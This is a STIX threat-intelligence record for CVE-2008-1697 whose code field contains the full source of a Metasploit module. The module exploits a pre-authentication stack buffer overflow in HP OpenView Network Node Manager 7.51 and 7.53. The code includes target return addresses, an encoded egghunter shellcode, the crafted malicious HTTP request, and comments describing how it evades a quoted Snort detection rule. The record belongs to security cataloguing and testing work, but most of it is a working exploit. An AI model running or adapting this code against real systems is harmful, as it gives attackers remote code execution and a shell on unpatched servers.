{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e736c13e-fdb4-4476-ab7f-4ef217d52c34",
    "created": "2024-08-14T16:54:00.304153Z",
    "modified": "2024-08-14T16:54:00.304157Z",
    "name": "HP OpenView NNM 7.53, 7.51 OVAS.EXE Pre-Authentication Stack Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in HP OpenView Network Node Manager versions 7.53 and earlier. Specifically this vulnerability is caused by a failure to properly handle user supplied input within the",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/hp_nnm_ovas.rb",
            "external_id": "hp_nnm_ovas.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-1697"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n=begin\n# This should bypass the following snort rule referenced from web-misc.rules (10/17/2008)\n# alert tcp $EXTERNAL_NET any -> $HOME_NET 7510 (msg:\"WEB-MISC HP OpenView Network Node Manager HTTP handling buffer overflow attempt\"; flow:to_server,established; content:\"GET \"; depth:4; nocase; isdataat:165,relative; content:\"/topology/homeBaseView\"; pcre:\"/GET\\s+\\w[^\\x0a\\x20]{165}/i\"; metadata:policy balanced-ips drop, policy security-ips drop; reference:bugtraq,28569; reference:cve,2008-1697; classtype:attempted-admin; sid:13715; rev:3;)\n# Newer versions of this rule might find this but we've taken steps to atleast bypass this rule\n=end\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n  # =( need more targets and perhaps more OS specific return values OS specific would be preferred\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'\t=> 'HP OpenView NNM 7.53, 7.51 OVAS.EXE Pre-Authentication Stack Buffer Overflow',\n      'Description'\t=> %q{\n          This module exploits a stack buffer overflow in HP OpenView Network Node Manager versions 7.53 and earlier.\n        Specifically this vulnerability is caused by a failure to properly handle user supplied input within the\n        HTTP request including headers and the actual URL GET request.\n\n        Exploitation is tricky due to character restrictions. It was necessary to utilize a egghunter shellcode\n        which was alphanumeric encoded by muts in the original exploit.\n\n        If you plan on using exploit this for a remote shell, you will likely want to migrate to a different process\n        as soon as possible. Any connections get reset after a short period of time. This is probably some timeout\n        handling code that causes this.\n      },\n      'Author'\t=>\n        [\n          'bannedit',\n          # muts wrote the original exploit and did most of the initial work\n          # credit where credit is due. =)\n          'muts'\n        ],\n      'References' =>\n        [\n          [ 'CVE', '2008-1697' ],\n          [ 'OSVDB', '43992' ],\n          [ 'BID', '28569' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'WfsDelay' => 45,\n          'EXITFUNC' => 'thread',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Payload' =>\n        {\n          'Space'\t\t=> 1000,\n          'BadChars'\t=> \"\\x0a\\x0d\\x00\",\n          'StackAdjustment'\t=> -3500,\n        },\n      'Platform' => 'win',\n      'Privileged' => true,\n      'Targets' =>\n        [\n          # need more but this will likely cover most cases\n          [ 'Automatic Targeting',\n            {\n              'auto' => true\n            }\n          ],\n\n          [ 'Windows 2003/zip.dll OpenView 7.53',\n            {\n              'Ret' => 0x6d633757  # pop pop ret\n            }\n          ],\n\n          [ 'Windows 2000/jvm.dll OpenView NNM 7.51',\n            {\n              'Ret' => 0x6d356c6e  # pop pop ret\n            }\n          ]\n        ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2008-04-02'))\n\n    register_options(\n      [\n        Opt::RPORT(7510),\n        OptString.new('UserAgent', [ true, \"The HTTP User-Agent sent in the request\",\n          'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0; SIMBAR={7DB0F6DE-8DE7-4841-9084-28FA914B0F2E}; SLCC1; .N' ])\n      ])\n  end\n\n\n  def exploit\n\n    targ = target\n\n    if (target['auto'])\n      print_status(\"Detecting the remote version...\")\n      resp = send_request_raw({'uri' => '/topology/home'}, 5)\n      if resp.nil?\n        print_status(\"No response to request\")\n        return Exploit::CheckCode::Safe\n      end\n\n      case resp.body\n        when /NNM Release B.07.53/\n          targ = targets[1]\n        when /NNM Release B.07.51/\n          targ = targets[2]\n        else\n          fail_with(Failure::NoTarget, \"Unable to determine a target automatically...\")\n          # if snmp is running you could set the target based on community strings\n\n      end\n    end\n    print_status(\"Using target: #{targ.name}\")\n    exploit_target(targ)\n  end\n\n\n  def exploit_target(targ)\n\n    # we have to use an egghunter in this case because of the restrictions\n    # on the characters we can use.\n    # we are using skape's egghunter alpha numeric encoded by muts\n    egghunter =\n      '%JMNU%521*TX-1MUU-1KUU-5QUUP\\AA%J'+\n      'MNU%521*-!UUU-!TUU-IoUmPAA%JMNU%5'+\n      '21*-q!au-q!au-oGSePAA%JMNU%521*-D'+\n      'A~X-D4~X-H3xTPAA%JMNU%521*-qz1E-1'+\n      'z1E-oRHEPAA%JMNU%521*-3s1--331--^'+\n      'TC1PAA%JMNU%521*-E1wE-E1GE-tEtFPA'+\n      'A%JMNU%521*-R222-1111-nZJ2PAA%JMN'+\n      'U%521*-1-wD-1-wD-8$GwP'\n\n    print_status(\"Constructing the malformed http request\")\n\n    buf = \"http://\"\n    buf << \"\\xeb\" * 1101\t\t# this gets mangled in such a way we can use less input\n    buf << \"\\x41\" * 4\t\t\t# sometimes less really is more\n    buf << \"\\x77\\x21\" \t\t# \\xeb is restricted so we use a conditional jump which is always taken\n    buf << [targ.ret].pack('V')\n    buf << \"G\" * 32\n    buf << egghunter\n    buf << \"\\x41\" * 100\n    buf << \":#{datastore['RPORT']}\"\n\n    # T00W is the egg\n    payload_buf = \"T00WT00W\" + make_nops(34) + \"\\x83\\xc4\\x03\" + payload.encoded\n\n    begin\n      connect\n      resp = send_request_raw({\n          'uri'     => buf + \"/topology/home\",\n          'version' => '1.1',\n          'method' => 'GET',\n          'headers' =>\n            {\n              'Content-Type' => 'application/x-www-form-urlencoded',\n              'User-Agent' => datastore['UserAgent'],\n            },\n          'data' => payload_buf\n        })\n    rescue ::Rex::ConnectionError, ::Errno::ECONNRESET, ::Errno::EINTR\n      # do nothing let the exploit live this catches the\n      # connection reset by peer error which is expected\n    end\n\n    if not resp.nil?\n      fail_with(Failure::Unknown, \"The server responded, that wasn't supposed to happen!\")\n    end\n\n    print_status(\"Malformed http request sent.\")\n    print_status(\"Now we wait for the egg hunter to work it's magic. thx skape!\")\n    handler\n    disconnect\n  end\n\n\n  def check\n\n    resp = send_request_raw({'uri' => '/topology/home'}, 5)\n    if resp.nil?\n      vprint_status(\"No response to request\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    if (resp.body =~ /NNM Release B\\.07\\.53/ || resp.body =~ /NNM Release B\\.07\\.52/ || resp.body =~ /NNM Release B\\.07\\.51/)\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2008-04-02",
    "x_mitre_platforms": [
        "win'"
    ]
}